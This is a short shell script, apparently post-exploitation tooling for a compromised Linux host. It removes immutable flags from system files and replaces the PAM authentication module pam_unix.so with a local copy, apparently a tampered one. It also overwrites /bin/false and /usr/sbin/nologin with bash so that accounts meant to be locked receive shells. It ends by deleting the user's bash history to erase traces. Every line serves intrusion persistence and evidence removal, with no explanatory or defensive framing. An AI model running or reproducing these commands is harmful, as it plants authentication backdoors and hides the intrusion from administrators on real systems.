./chattr -i /lib/x86_64-linux-gnu/security/pam_unix.so
./chattr -i /bin/false
./chattr -i /usr/sbin/nologin
cp ./pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
cp ./bash /bin/false
cp ./bash /usr/sbin/nologin
rm ~/.bash_history
